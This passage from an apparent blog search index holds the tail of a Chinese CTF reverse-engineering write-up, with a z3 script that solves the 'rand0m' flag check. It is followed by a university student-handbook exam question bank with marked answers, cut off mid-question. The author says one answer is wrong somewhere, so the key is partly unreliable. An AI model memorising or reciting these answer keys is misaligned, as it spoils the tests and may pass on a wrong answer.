int_52;    __int64* int_53;    __int64* int_54;    __int64* int_55;    __int64* int_56;    __int64* int_57;    __int64* int_58;    __int64* int_59;    __int64* int_60;    __int64* int_61;    __int64* int_62;    __int64* int_63;&#125; iint;\n\n在字符串表找到”rand0m.check”交叉引用查看check函数，这里因为恢复了符号的关系，函数名有点问题，不过不影响。\n发现有两处引用先看第一处，其实就是在初始化上下文信息并调用check函数，也就是_Pyx_VerifyCachedType_0()\n\ncheck函数的逻辑大概是\ncheck：data=[304643896,2563918650,1244723021,3773946743,37360232,2918417411,2282784775,3628702646]i=0result = rand0m(input[i * 8:(i+1)*8:]) # 对我们输入的字符串8个字符切片，由rand0m函数可知这是4字节的数据compare(result[1],data[i]) #比较结果compare(result[0],data[i+1])i++#循环多次知道字符串处理完毕\n\n再看rand0m函数，用搜索字符串方式找到，同样会有一个是初始化函数。逻辑大概如下\nrand0m:v12 = int(input,16) #会把我们的输入从16进制转为10进制，说明我们的输入是16进制字符，一共4字节v12 ^ 2654435769v12 &gt;&gt; 5 &gt;&gt; 23(v12 &lt;&lt; 4) &amp; 4198170623((v12 &lt;&lt; 4) &amp; 4198170623) + (v12 &gt;&gt; 5 &gt;&gt; 23)(((v12 ^ 2654435769) &gt;&gt; 11) ** 65537) % 4294967293res[0] = (((v12 ^ 2654435769) &gt;&gt; 11) ** 65537) % 4294967293res[1] = ((v12 &lt;&lt; 4) &amp; 4198170623) + (v12 &gt;&gt; 5 &gt;&gt; 23)return res\n\n从上面可以看到res的两个结果是由同一个值（我们的输入）计算出来的，其中涉及到一些位运算，这可以用z3求解器求解，而另一个涉及到了模和幂的运算是几乎不可能被反推的。但是z3求解器只能求解出其中一个解，而((v12 &lt;&lt; 4) &amp; 4198170623) + (v12 &gt;&gt; 5 &gt;&gt; 23)有很多的解。或许我们可以可以用res[0]的值来确定这个唯一解。即用z3求出来的一个结果传入rand0m.rand0m函数，拿res的值和正确的值比较，并不断添加条件，知道我们求出与原密文相同的解。\n脚本如下\nfrom z3 import*import rand0mflag =&quot;&quot;for i in range(0, 8, 2):    data = [304643896,2563918650,1244723021,3773946743,37360232,2918417411,2282784775,3628702646]    v12 = BitVec(&quot;input&quot;, 32) #创建一个向量未知量，用于位运算    s = Solver()     dt = ((v12 &lt;&lt; 4) &amp; 4198170623) + (v12 &gt;&gt; 28) # 运算逻辑    s.add(And(data[i] - 0x10 &lt;= dt, dt &lt;= data[i] + 0x10)) #位运算有误差，把满足的条件放大会更好找答案    while s.check() == sat:  #如果有解        module = s.model()        result = module[v12].as_long() #获取结果为python整数，以便进行下面的操作        result_hex = hex(result)[2:] #转16进制字符串并去掉开头的0x        check = rand0m.rand0m(result_hex) #传入rand0m函数获取res值        if check[0] == data[i+1] and check[1] == data[i]: #验证res的两个值是否符合，注意这里比较的顺序            print(f&quot;&#123;result_hex&#125;&quot;)            flag += result_hex            break        s.add(v12 != result) #如果不符合则添加条件排除当前值print(f&quot;flag&#123;&#123;&#123;flag&#125;&#125;&#125;&quot;) #输出flag# flag&#123;813a97f3d4b34f74802ba12678950880&#125;\n\n","categories":["WriteUp"],"tags":["re，WriteUp"]},{"title":"学生手册考试题库","url":"/2024/11/06/%E5%AD%A6%E7%94%9F%E6%89%8B%E5%86%8C%E9%A2%98%E5%BA%93/","content":"按Ctrl+F,或者在浏览器的右上角3个点中选择&quot;在此页面上查找&quot;，然后输入关键词（推荐搜索选项）搜索就可以啦 (｡･ω･｡)ﾉ♡\n\n不知道哪里错了一题，结果可能会少3分\n\n\n1.公寓文明和安全篇\n1.(单选题, 1.0 分)如发现获奖寝室在参评当年有任何不符合获奖条件的或 有两次校检、院检不达标的,由学校收回荣誉并通报。A. 下一学期B. 下一学年C. 本学年D. 本学期正确答案: B\n2.(单选题, 1.0 分)根据《学生手册》退还住宿费的标准应按照以下哪种方式计算?A. 每学年住宿费标准÷10 个月×(10-学生实际在校月数)B. 每学年住宿费标准÷12 个月×(12-学生实际在校月数)C. 每学年住宿费标准÷303天×(303-学生实际在校天数)D. 每学年住宿费标准÷365天×(365-学生实际在校天数)正确答案: A\n3.(单选题, 1.0 分)寝室建设情况作为学生党员发展、转正、考核的重要依据。 学期内 次及以上被认定为周整改寝室的全体寝室成员,予以全校通报,并取消该寝室成员本学年的评奖、评优、评先及入党资格。A. 5B. 4C. 3D. 2正确答案: C\n4.(单选题, 1.0 分)学生如有存放、使用违规电器,未造成不良后果的,发现1次给予通报批评,累计2次给予严重警告处分;造成不良后果的,视后果程度,给予 处分;后果特别严重的,给予开除学籍处分。A. 记过B. 记过至留校察看C. 留校察看D. 警告正确答案: B\n5.(单选题, 1.0 分)寝室允许使用的电水壶,功率须为 且具备防干烧及自动断电功能。A. 1500瓦B. 1200瓦C. 1200瓦以上D. 1500瓦以下正确答案: D\n6.(单选题, 1.0 分)学生自觉遵守请假制度和作息制度。除学校、学院统一安排的集体活动外,学生因回家等原因,不能返校就寝者 (包括双休日和节假日),事先应向 办理好请假手续,获准后方可离校。A. 学生社区服务中心B. 学校学生工作管理科C. 学院学生工作办公室D. 后勤集团正确答案: C\n7.(单选题, 1.0 分)组织校内 人、校外 人以上的大型活动,组织者应当按照学校《大型活动安全 管理办法》的要求制定安全工作方案,明确安全负责人,并报主管部门审批,按照“谁主办谁负责”的原则做好安全保卫工作。A. 400 300B. 500 200C. 400 200D. 500 300正确答案: B\n8.(单选题, 1.0 分)申请参评达标寝室需向所在学院递交申请表,逾期视同放弃参评资格。不同学院学生混住寝室原则上向 申报。A. 寝室长所在学院B. 多数学生所在学院C. 寝室成员原学院D. 寝室划分的管理学院正确答案: A\n9.(单选题, 1.0 分)文明责任区检查过程中,烟头、瓜皮果壳等较小(以烟盒大小为标准,体积小于烟盒者)可见垃圾, 算一处,每处扣 0.2 分。A. 每一个B. 每片区域C. 每平方米D. 每三个正确答案: C\n10.(单选题, 1.0 分)在校内公开发行的印刷品,应当按学校有关规定报主管部门审批, 未经批准不得编印。A. 所有B. 大部分C. 少部分D. 个别正确答案: A\n11.(单选题, 1.0 分)文明责任区检查过程中,车辆未按要求停放在规定区域的或停放在路口、拐弯路 段、道路中间等阻碍通行的区域的,将扣除负责学院 。A. 2分B. 每个区域2分C. 每次2分D. 每辆2分正确答案: D\n12.(单选题, 1.0 分)寝室检查过程中,发现垃圾溢出垃圾桶情况,应扣除多少分?A. 2B. 5C. 10D. 20正确答案: B\n13.(单选题, 1.0 分)学校规定允许使用的电器,须以寝室为单位,于每学期开学后 周内或新购置电器后 周内到片区公寓管理办公室签署 《学生寝室电器安全使用承诺书》,并领取、张贴安全用电标识。A. 2、1B. 3、2C. 3、1D. 2、2正确答案: A\n14.(单选题, 1.0 分)、广告牌、张贴物等户外宣传品须经学校主管部门批准同意后放置在指定或许可的地点并及时清除。A. 横幅B. 伞棚C. 海报D. 旗帜正确答案: A\n15.(单选题, 1.0 分)校级文明寝室应在 中产生。A. 年度达标寝室B. 最美寝室C. 优良学风寝室D. 特色寝室正确答案: A\n16.(单选题, 1.0 分)遵守宿舍管理规定。按时熄灯就寝,不 、 ,不影响他人的正常学习和休息。A. 唱歌、朗诵B. 喧哗、吵闹C. 追逐、打闹D. 熬夜、通宵正确答案: B\n17.(单选题, 1.0 分)寝室检查成绩为多少时将被认定为需要整改?A. ＜100B. ＜90C. ＜80D. ＜70正确答案: C\n18.(单选题, 1.0 分)不得在学校从事任何形式的宗教活动,不得在学校穿戴有浓厚宗教色彩的服饰。A. 学生B. 教师C. 行政人员D. 任何组织和个人正确答案: D\n19.(单选题, 1.0 分)学校每周组织检查评定达标寝室。一学年整改次数不超过 次的方可参评学年达标寝室。A. 5B. 4C. 3D. 2正确答案: D\n20.(单选题, 1.0 分)发扬艰苦奋斗精神。勤俭节约,不浪费水、电、粮食,不向 提出超过实际可能的生活要求。A. 家庭B. 社会C. 学校和家庭D. 学院正确答案: C\n21.(单选题, 1.0 分)周五、周六晚上,学生必须在 以前回寝室就寝,其它时间必须在 以前回寝室就寝,不得夜不归宿。因特殊原因迟归晚出者,须凭本人证件向公寓值班员说明情况,进行登记后方可进出公寓。A. 23:00、22:30B. 22:30、23:00C. 22:30、22:00D. 23:30、23:00正确答案: D\n22.(单选题, 1.0 分)根据《浙江师范大学寝室安全卫生检查标准》,达标寝室评分要求在 分以上。A. 60B. 70C. 80D. 90正确答案: C\n23.(单选题, 1.0 分)师生员工组织成立团体,应当按学校有关规定提出书面申请,报学校批准,未经批准不得成立和开展活动。所有团体应当报 备案。A. 学生社团管理部门B. 学生处C. 教务处D. 保卫处正确答案: D\n24.(单选题, 1.0 分)联合外单位举办活动或外单位借用学校场地举办活动,应当报 审批,未经同意不得举办。A. 保卫处B. 学生处C. 学院学生工作办公室D. 校长办公室正确答案: D\n25.(单选题, 1.0 分)学校 学生在公寓内开展有益于身心健康的学术科技、文化体育等活动,营造和谐、有序、健康、向上 的学生集体生活氛围,但不得影响他人的正常学习和生活。A. 提倡B. 支持C. 提倡并支持D. 禁止正确答案: C\n26.(单选题, 1.0 分)热爱劳动,积极参加社会实践和勤工助学活动。不参与 。A. 校内学生活动B. 校外学生活动C. 校内经商活动D. 校外实践活动正确答案: C\n27.(单选题, 1.0 分)学生不得私自调换寝室 或加装 ,不得将钥匙借予非本寝室成员使用。私自调换或加装的,学校有权拆除,并追究其相关责任。A. 空调B. 门锁C. 电话D. 直饮水机正确答案: B\n28.(单选题, 1.0 分)人员离开寝室时应及时关闭电源延长线(接线板)的电源开关,不得将手机、电脑、电风扇、排气扇等电器的电源线或充电器处于 状态。A. 闲置B. 运作C. 供电D. 关闭正确答案: B\n29.(单选题, 1.0 分)学校因公寓维修、改造、建设、功能区划改变等需 的,住宿学生应予积极配合,服从统一安排。A. 对寝室安排进行调整B. 收取相关费用C. 清空部分寝室D. 集中住宿正确答案: A\n30.(单选题, 1.0 分)寝室允许使用的电器从正规渠道购买且为通过 认证、质量过硬的合格产品,不得使用“三无”(无中文标识、无厂名、无厂址)电器产品。A. 2CB. 3CC. 3WD. 2W正确答案: B\n31.(多选题, 2.0 分)师生举行 、 、 等活动,应当按照法律程序和有关规定获得批准。对未获批准的,学校有权依法劝阻或者制止。A. 大型集会B. 游行C. 示威D. 演出正确答案: ABC\n32.(多选题, 2.0 分)注重个人品德修养。服饰整洁,仪表端庄;诚实守信、谦虚谨慎;说话和气,待人有礼;男女交往,举止得体;尊敬师长,尊重他人;敬老爱幼,乐于助人。不穿 、 、 进出公共场所,不讲粗话、脏话。A. 背心B. 裤衩C. 吊带衫D. 拖鞋正确答案: ABD\n33.(多选题, 2.0 分)具有以下情况之一不得评定为达标寝室:A. 寝室内床上使用柜子或其他储物柜B. 未按学校要求将“寝室公约”、“安全用电承诺书”上墙张贴C. 垃圾直接扫到过道上,不投放到指定地点D. 饲养猫狗兔鼠蛇等影响他人生活的宠物正确答案: ABCD\n34.(多选题, 2.0 分)在校学生应按指定寝室和床位住宿,不得擅自占用 、 、 、留宿、 学生寝室及床位,未经批准不得进入异性寝室。A. 出租B. 借宿C. 调整D. 对调正确答案: ABC\n35.(多选题, 2.0 分)文明寝室评选需要具备哪些条件?A. 寝室成员无旷课、迟到、早退等情况B. 有寝室成员在上学年获得过三等及以上优秀学生奖学金C. 二、三年级有寝室成员主持校院两级科研项目或在校级科研竞赛中获奖D. 每学年至少向学院报送寝室微故事2个正确答案: ABCD\n36.(多选题, 2.0 分)特色寝室包括以下哪些类型?A. 和谐友善寝室B. 优良学风寝室C. 文明达标寝室D. 学生工作优秀寝室正确答案: ABD\n37.(多选题, 2.0 分)学生须遵守公共秩序,不得 。A. 在公寓区内推销、分发 传单、从事经营活动B. 有赌博、酗酒、吸烟、吸毒、 结伙滋事、打架斗殴及其它危及他人人身安全等违法、违规、违纪活动C. 损坏和拆卸学生公寓内的公共设施和公共财物D. 擅自在墙壁和家具上刻写涂画正确答案: ABCD\n38.(多选题, 2.0 分)学生应提高警惕, , , ,自觉做好防盗、防骗、防火、防破坏、防自然灾害等工作,发现安全隐患和违法犯罪行为,及时向有关部门报告。A. 倡导垃圾分类B. 外出随手关好寝室门窗C. 抵制上门推销D. 提高网络转账等防骗意识正确答案: BCD\n39.(多选题, 2.0 分)下列属于学生寝室内允许使用的电器有:A. 电吹风B. 电冰箱(车载冰箱除外)C. 多功能养生壶D. 折叠电热水壶正确答案: AB\n40.(多选题, 2.0 分)任何组织和个人都不得干扰和破坏学校的教育教学、科研和生活秩序,不得妨碍他人根据学校的安排进行教育教学、科研和其他活动。任何组织和个人应自觉遵守公民道德规范, 自觉遵守学校管理制度,创造和维护 、 、 、 的校园环境。A. 文明B. 整洁C. 优美D. 安全正确答案: ABCD\n\n2.评奖评优篇\n1.(单选题, 1.0 分)在浙江师范大学本(专)科学生综合素质评价实施办法(试行)中,学生综合素质评价的内容包含 个方面。A. 2B. 3C. 4D. 5正确答案: D\n2.(单选题, 1.0 分)在身体素质评价记实申报减分的适用条件及标准中,健康步行记实学年内平均每天未达到____步的该项不得分,在实施过程中有作弊记实查处的,该项直接记为0分,并给予通报批评。A. 5000B. 6000C. 7000D. 8000正确答案: B\n3.(单选题, 1.0 分)在德育美育素质评价基本分的得分条件中,第五点热心公益、志愿服务,参加学校(或学院)认定的志愿服务时间不少于__小时。A. 10B. 15C. 20D. 5正确答案: B\n4.(单选题, 1.0 分)在浙江师范大学本(专)科学生荣誉称号评定办法中,以下不属于个人荣誉称号的是( )A. 三好学生B. 五好学生C. 优秀毕业生D. 优秀学生干部正确答案: A\n5.(单选题, 1.0 分)在浙江师范大学本(专)科学生综合素质评价实施办法(试行)中,能力评价部分,校级课题结题加____分。A. 8B. 6C. 10D. 4正确答案: A\n6.(单选题, 1.0 分)在浙江师范大学本(专)科学生荣誉称号评定办法中,参评省级优秀毕业生的,四年制学生须累计获得至少2次____及以上优秀学生奖学金,并累计获得至少2次校五好学生、优秀学生干部、优秀共产党员、优秀团员、优秀团干等荣誉称号。A. 一等B. 二等C. 三等D. 特等正确答案: B\n7.(单选题, 1.0 分)在浙江师范大学本(专)科学生综合素质评价实施办法(试行)中,学年综合素质评价分为基本评价和____两个部分。A. 德育美育素质评价B. 劳动素质评价C. 发展评价D. 能力评价正确答案: C\n8.(单选题, 1.0 分)“十佳学子”评选活动分为学生申请或班级推荐、学院推荐、学校评审三个步骤,严格遵照评选条件评定,每届评选10名“十佳学子”、____名“十佳学子”提名奖、____名砺学风采奖。A. 15,5B. 15,10C. 20,5D. 20,10正确答案: C\n9.(单选题, 1.0 分)省政府奖学金的奖励金额为每年____元&#x2F;人。A. 8000B. 7000C. 6000D. 5000正确答案: C\n10.(单选题, 1.0 分)在德育美育素质评价记实申报加分的适用条件及标准中,学生个人获得荣誉称号的(社会实践类荣誉称号除外),国家级加_分。A. 25B. 20C. 15D. 12正确答案: B\n11.(单选题, 1.0 分)在浙江师范大学本(专)科学生荣誉称号评定办法中,以下不属于先进班级评定条件的是A. 有一个团结奋进的班委会,在班集体建设中起到核心作用。班干部在各方面以身作则,起模范带头作用B. 具有优良的班风,学习风气浓厚,符合优良学风班级的评定条件C. 全班同学积极上进,遵守国家法律和学校规章制度,当学年内无人受违纪处分D. 课堂秩序良好,同学之间在学习上互相帮助,取长补短,共同进步正确答案: D\n12.(单选题, 1.0 分)在德育美育素质评价记实申报减分的适用条件及标准中,学生违反校规校纪的,通报批评减____分&#x2F;次,警告处分减____分&#x2F;次。A. 10,15B. 15,20C. 10,20D. 5,10正确答案: A\n13.(单选题, 1.0 分)国家奖学金的评选条件是上一学年知识水平评价在班级(或专业)前____。符合校优秀学生一等奖学金的评选条件,在此基础上,按发展评价择优评定。A. 5%B. 10%C. 15%D. 20%正确答案: B\n14.(单选题, 1.0 分)在浙江师范大学本(专)科学生荣誉称号评定办法中,优秀学生干部称号的授予条件是德育美育素质评价为班级前____,知识水平评价位班级前____。A. 30%,50%B. 40%,50%C. 30%,60%D. 40%,60%正确答案: D\n15.(单选题, 1.0 分)在浙江师范大学本(专)科学生综合素质评价实施办法(试行)中,能力评价部分,发表1篇二级期刊论文加____分。A. 40B. 35C. 30D. 25正确答案: C\n16.(单选题, 1.0 分)在本科学生考研奖学金评定办法(试行)中,被我国“双一流”高校、“双一流”学科、中科院系列科研院所或中国社会科学院或我校录取为研究生的应届本科毕业生,奖励____元&#x2F;人。A. 1000B. 1500C. 2000D. 800正确答案: A\n17.(单选题, 1.0 分)单项奖学金中的学业优秀奖学金用于奖励学习努力、知识水平评价在班级前____、所在学年无课程不及格,但未获三等及以上优秀学生奖学金者。A. 15%B. 20%C. 25%D. 30%正确答案: D\n18.(单选题, 1.0 分)在本科学生考研奖学金评定办法(试行)中,被世界排名前100名的高校或ESI世界排名前1‰的学科录取为研究生的应届本科毕业生, 奖励____元&#x2F;人, 并在毕业典礼上授予校长特别奖。A. 1500B. 2000C. 2500D. 3000正确答案: B\n19.(单选题, 1.0 分)奖学金评审小组依据具体条件评审出各类学生奖学金,经公示____个工作日后,报学校评审委员会。A. 3B. 4C. 5D. 7正确答案: C\n20.(单选题, 1.0 分)在劳动素质评价记实申报减分的适用条件及标准中,在寝室安全卫生检查中被认定为周整改寝室的,寝室责任人减____分&#x2F;次,寝室其他成员根据实际情况扣分。A. 1B. 1.5C. 2D. 3正确答案: C\n21.(单选题, 1.0 分)已经获得过“十佳学子”提名奖及以上荣誉称号的,____年内不重复参评。A. 1B. 2C. 3D. 4正确答案: C\n22.(单选题, 1.0 分)在浙江师范大学本科生出国(境)交流奖学金评定办法中,成团项目奖学金评定,三个月(含)以上成团项目赴全球综合排名前100的大学或全球排名前50的专业进行三个月(含)以上专业课程学习的项目, 资助不超过____万元人民币&#x2F;生;其余三个月(含)以上项目资助不超过____万元人民币&#x2F;人。A. 5,3B. 5,1.5C. 3,2D. 3,1.5正确答案: A\n23.(单选题, 1.0 分)在浙江师范大学本(专)科学生荣誉称号评定办法中,以下哪种不属于集体荣誉称号:A. 优良学风班级B. 先进班级C. 学风特优班级D. 文明班级正确答案: D\n24.(单选题, 1.0 分)在浙江师范大学本科生出国(境)交流奖学金评定办法中,特别奖学金资助对象为赴全球综合排名前 50 的大学进行专业课程学习三个月(含)以上的学生。学校将资助交流所需一个学期的学费和一次性往返机票费用,资助金额最高不超过____万元人民币&#x2F;人。A. 20B. 15C. 10D. 5正确答案: B\n25.(单选题, 1.0 分)优秀学生奖学金一等奖学金按学生数的____评定,奖励金额为____元&#x2F;人。A. 6%,2000B. 8%,2000C. 6%, 1500D. 8%,1500正确答案: A\n26.(多选题, 2.0 分)学校对获得奖学金的学生进行的奖励有:A. 学校颁发纪念奖品B. 学校颁发奖学金C. 统一表彰,颁发荣誉证书D. 获奖情况存入个人档案正确答案: BCD\n27.(多选题, 2.0 分)在浙江师范大学本(专)科学生奖学金评定办法(试行)中,共有以下哪几类奖学金A. 国家奖学金B. 省政府奖学金C. 校优秀学生奖学金D. 单项奖学金正确答案: ABCD\n28.(多选题, 2.0 分)在浙江师范大学本(专)科学生综合素质评价实施办法(试行)中,以下属于德育美育素质评价记实申报减分的适用条件及标准的是:A. 经批准夜不归宿或私自在寝室内留宿他人的,经查实,减5分&#x2F;次,擅自在校内外租借房居住,经查实,减10分&#x2F;次B. 在校内饲养猫狗兔鼠蛇等宠物或有酗酒等不良行为但未构成处分或通报批评的,经查实,减2~4分&#x2F;次C. 不讲社会公德、不讲诚信、损坏公物、浪费能源资源或破坏环境但未构成处分或通报批评的,经查实,减3分&#x2F;次D. 未经准假而不参加政治学习、组织生活、班级活动及校、院规定必须参加的集体活动的,经查实,减2分&#x2F;次正确答案: ABCD\n29.(多选题, 2.0 分)以下属于浙江师范大学本(专)科学生荣誉称号评定办法中参评个人荣誉称号基本条件的是:A. 拥护中国共产党领导,努力学习马克思列宁主义、毛泽东思想、邓小平理论、“三个代表”重要思想、科学发展观、习近平新时代中国特色社会主义思想B. 树立爱国主义思想,具有团结统一、爱好和平、勤劳勇敢、自强不息的精神C. 遵守宪法、法律、法规,遵守公民道德规范,遵守学校管理制度,具有良好的道德品质和行为习惯D. 刻苦学习,勇于探索,积极实践,努力掌握现代科学文化知识和专业技能正确答案: ABCD\n30.(多选题, 2.0 分)以下属于优秀毕业生评选条件的是:A. 毕业实习成绩为良好及以上(因中外联合培养无需毕业实习成绩除外)B. 本科毕业生在评选时应符合学士学位授予条件,且评选时段未受处分C. 在经学校有关部门认定的学生组织中担任学生干部满1学年,工作认真负责且富有成效,工作考核等级为优秀D. 德育美育素质评价为班级前40%,知识水平评价为班级前60%正确答案: AB\n31.(多选题, 2.0 分)在浙江师范大学本(专)科学生综合素质评价实施办法(试行)中,以下属于德育美育素质评价记实申报加分的适用条件及标准的是:A. 学生所在集体获得荣誉称号的(社会实践类荣誉称号除外),国家级加20分,省部级加912分,校级加48分,院级加13分,其加分办法为:核心成员权重为0.60.8,一般成员为0.20.4,不分先后则均为0.5B. 应征入伍退伍返校学习且在部队未受处分,自复学后每学年加4分;在团级及以上部队单位获得嘉奖的,每学年加6分;荣立三等功及以上的,每学年加8分C. 学院认定的记实申报加分的其它适用条件及标准D. 严禁从事非法宗教活动;严禁宗教活动、宗教行为、宗教言论、宗教服饰等进校园,如违规,经查实,减410分&#x2F;次正确答案: ABC\n32.(多选题, 2.0 分)以下属于“十佳学子”评选条件的是:A. 学习成绩优异,获得两次以上校一等奖学金B. 科研发明方面表现突出,在“挑战杯”竞赛、学科竞赛等活动中取得优异成绩C. 积极参与各类社会实践活动及公益服务,表现突出并产生较大的社会影响D. 在省级以上重大文体赛事中取得突出成绩正确答案: ABCD\n33.(多选题, 2.0 分)在浙江师范大学本(专)科学生综合素质评价实施办法(试行)中,以下属于劳动素质评价记实申报加分的适用条件及标准的是:A. 所在寝室符合学年达标寝室的,寝室成员每人加15分B. 自觉遵守垃圾分类相关规定,学年内垃圾分类检查未扣分的,每人加5分C. 参加学校学院文明包干区管理且未扣分的,每次加2分;所在学院在月考核排名中列全校前5名(含第5名)的,涉及学生追加1分D. 参加各类劳动教育活动,考评合格的每次加2分正确答案: ABCD\n34.(多选题, 2.0 分)以下属于“十佳学子”评选步骤中学校评审部分的是:A. 学校成立“十佳学子” 评审委员会,由学校分管领导、学生工作部门有关负责人、各学院党委(总支)副书记等组成,下设评审委员会办公室,办公室设在党委学工部(学生处)B. 学校根据候选人事迹确定“十佳学子”初选名单和候选人名单C. 经专家评审,确定“十佳学子”、“十佳学子”提名奖、砺学风采奖获得者名单D. “十佳学子”由学校统一发文表彰,并授予浙江师范大学“十佳学子”荣誉称号,颁发荣誉证书和奖金正确答案: ABC\n35.(多选题, 2.0 分)在浙江师范大学本(专)科学生荣誉称号评定办法中,以下属于优良学风班级评定的条件是:A. 全班有良好的学习风气、积极的学习态度和严谨的学风B. 班级成员能积极参加体育锻炼和各项有益活动,如创新创业、科研发明、学科竞赛、社会实践、文体活动、公益服务和文明建设等,并取得良好效果C. 全班同学积极上进,学习刻苦,学习目的明确,成绩优良,学风建设绩效值排名同年级前30%以内D. 全班同学自觉遵守考试纪律,无考试作弊行为正确答案: ACD\n36.(多选题, 2.0 分)在能力评价加分标准中,以下工作岗位所加分值为6分的是:A. 相关职能部门组建的学生组织主要负责人B. 学生社团主要负责人C. 班长、团支书D. 相关职能部门组建的学生组织正副部长正确答案: BCD\n37.(多选题, 2.0 分)在浙江师范大学本(专)科学生综合素质评价实施办法(试行)中,以下属于劳动素质评价基本分达标项目的是:A. 树立正确的劳动观念B. 具有必备的劳动能力C. 培育积极的劳动精神D. 养成良好的劳动习惯和品质正确答案: ABCD\n38.(多选题, 2.0 分)校优秀学生奖学金的评选条件是:A. 德育美育素质评价达到良好及以上等级B. 知识水平评价位于班级前40%C. 身体素质评价合格及以上等级D. 劳动素质评价合格及以上等级正确答案: ABCD\n39.(多选题, 2.0 分)在浙江师范大学本科学生考研奖学金评定办法(试行)中,考研被以下哪些院校录取的可以奖励1000元&#x2F;人:A. “双一流”学科院校B. “双一流”高校C. 中科院系列科研院所D. 浙江师范大学正确答案: ABCD\n40.(多选题, 2.0 分)申请本科生出国(境)交流奖学金的学生,必须首先满足以下基本条件:A. 浙江师范大学全日制中国籍本科生B. 热爱祖国,遵纪守法,道德品质优良,身心健康C. 申请者已修平均学分绩点原则上在本专业同年级排名前50%。申请成团项目奖学金可放宽至前70%D. 在校期间,学习努力,成绩优良正确答案: ABCD\n41.(多选题, 2.0 分)在浙江师范大学本(专)科学生综合素质评价实施办法(试行)中,以下属于劳动素质评价记实申报减分的适用条件及标准的是:A. 违反垃圾分类有关规定,每发现1次扣1分,违规3次的,视情节轻重由所在学院按相关规定给予通报批评或纪律处分B. 在学校学院文明包干区检查中,所管理包干区扣分1次,相关责任人扣0.5分C. 健康步行记实为学年内平均每天达到6000步的健康步行成绩记50分,达到8000步的健康步行成绩记75分,达到10000步的健康步行成绩记100分D. 学院认定的记实申报减分的其它使用条件及标准正确答案: ABD\n42.(多选题, 2.0 分)在浙江师范大学本(专)科学生综合素质评价实施办法(试行)中,学院综合素质评价工作小组由学院分管领导、学工办主任、辅导员、学生会主席等组成,以下属于其主要职责是:A. 结合本院实际制定综合素质评价实施细则和补充规定B. 布置安排班级综合素质评价工作,做好综合素质评价的各项准备工作C. 审核和确认班级同学综合素质评价的相关材料;审议、公告和上报班级综合素质评价结果D. 对班级综合素质评价工作实施监督和指导正确答案: AD\n43.(多选题, 2.0 分)在浙江师范大学本(专)科学生荣誉称号评定办法中,以下属于先进班级评定的条件是:A. 全班同学积极上进,遵守国家法律和学校规章制度,当学年内无人受违纪处分B. 有一个团结奋进的班委会,在班集体建设中起到核心作用。班干部在各方面以身作则,起模范带头作用C. 班级成员积极参加学生宿舍的文明建设,自觉维护和保持宿舍的环境,有1个校级最美寝室或2个校级文明寝室或有60%寝室被评为院级文明寝室D. 课堂秩序良好,同学之间在学习上互相帮助,取长补短,共同进步正确答案: ABC\n44.(多选题, 2.0 分)在浙江师范大学本(专)科学生综合素质评价实施办法(试行)中,以下属于德育美育素质评价基本分要求的是:A. 坚持四项基本原则,拥护党的路线、方针、政策,遵守国家法律、法规B. 践行社会主义核心价值观,弘扬中华优秀传统文化、革命文化、社会主义先进文化,传承中华民族传统美德,学习弘扬雷锋精神C. 遵守社会公德,维护学校及大学生自身形象D. 关心集体,完成学校、学院规定的各项任务正确答案: ABCD\n45.(多选题, 2.0 分)以下属于“十佳学子”评选步骤中学院推荐部分的是:A. 各学院成立“十佳学子”评选推荐小组,由分管学生工作的领导任组长,成员由学工办辅导员、教师(班主任)代表、学生代表等组成B. 学院“十佳学子”评选推荐小组要严格依据评选条件,推荐候选人预备人选C. “十佳学子”候选人初评结果经公示后,报送学校评审委员会办公室。D. 凡符合评选对象的学生或其所在班级根据评选条件,填写《浙江师范大学“十佳学子”评选推荐表》,报送学院学生工作办公室正确答案: ABC\n46.(多选题, 2.0 分)以下属于单项奖学金的有:A. 研究与创新奖学金B. 学业优秀奖学金C. 社会实践优秀奖学金D. 社会工作优秀奖学金正确答案: ABCD\n47.(多选题, 2.0 分)在浙江师范大学本(专)科学生综合素质评价实施办法(试行)中,身体素质评价包含以下哪几个方面:A. 体质健康测试成绩B. 课外体育锻炼成绩C. 健康步行成绩D. 体能测试成绩正确答案: ABC\n48.(多选题, 2.0 分)在浙江师范大学本(专)科学生综合素质评价实施办法(试行)中,以下属于劳动素质评价维度的是:A. 掌握通用劳动科学知识,深刻理解马克思主义劳动观和社会主义劳动关系,树立正确的择业就业创业观,具有到艰苦地区和行业工作的奉献精神和奋斗精神B. 巩固良好日常生活劳动习惯,自觉做好宿舍卫生保洁,独立处理个人生活事务,积极参加勤工助学活动,提高劳动自立自强能力C. 强化服务性劳动,自觉参与教室、食堂、校园场所的卫生保洁、绿化美化和管理服务等,结合社会实践活动开展服务性劳动,强化公共服务意识和面对重大疫情、灾害等危机主动作为的奉献精神D. 重视生产劳动锻炼,积极参加实习实训、专业服务和创新创业活动,重视新知识、新技术、新工艺、新方法的运用,提高在生产实践中发现问题和创造性解决问题的能力,在动手实践的过程中创造有价值的物化劳动成果正确答案: ABCD\n49.(多选题, 2.0 分)在浙江师范大学本(专)科学生综合素质评价实施办法(试行)中,以下属于能力评价依据的是:A. 创新创业B. 专业技能C. 社会工作D. 文体特长正确答案: ABCD\n50.(多选题, 2.0 分)在浙江师范大学本(专)科学生综合素质评价实施办法(试行)中,以下属于文艺及新闻作品的是:A. 报刊(应具有CN和ISSN刊号或相关部门审批的内部准印号)B. 校网首页通过文字、视频、图片等形式发表的文学、艺术作品C. 学校官方微信上通过文字、视频、图片等形式发表的文学、艺术作品D. 学生记者、编辑等从事宣传工作的学生发表的新闻作品正确答案: ABCD\n\n3.学生资助篇\n1.(单选题, 1.0 分)同一学年内,申请国家励志奖学金的家庭经济困难学生可同时申请并获得( )。A. 国家奖学金B. 校励志奖学金C. 省政府奖学金D. 国家助学金正确答案: D\n2.(单选题, 1.0 分)()用国家助学金来抵学生学费。A. 不可以B. 可以C. 视情况而定D. 可以商量正确答案: A\n3.(单选题, 1.0 分)在学生资助对象认定程序中学生需要填写的资料是( )。A. 《浙江师范大学学生资助对象认定工作记录表》B. 《浙江师范大学校励志奖学金申请表》C. 《浙江师范大学学生资助对象认定申请表》D. 《浙江师范大学学生资助对象认定档案表》正确答案: C\n4.(单选题, 1.0 分)国家助学金( )评定一次,坚持公开、公平、公正和集体决定的原则。A. 每学期B. 每学年C. 每半年D. 每两年正确答案: B\n5.(单选题, 1.0 分)临时补助金发放过程程序是由学生处(校学生资助管理中心)审核确定补助金额并前些《 》,学生本人凭此单和学生证、身份证到计财处领取补助金。A. 临时困难补助发放单B. 浙江师范大学临时困难补助发放单C. 补助发放单正确答案: A\n6.(单选题, 1.0 分)以下内容不属于学校学生处协助经办银行做好的工作( 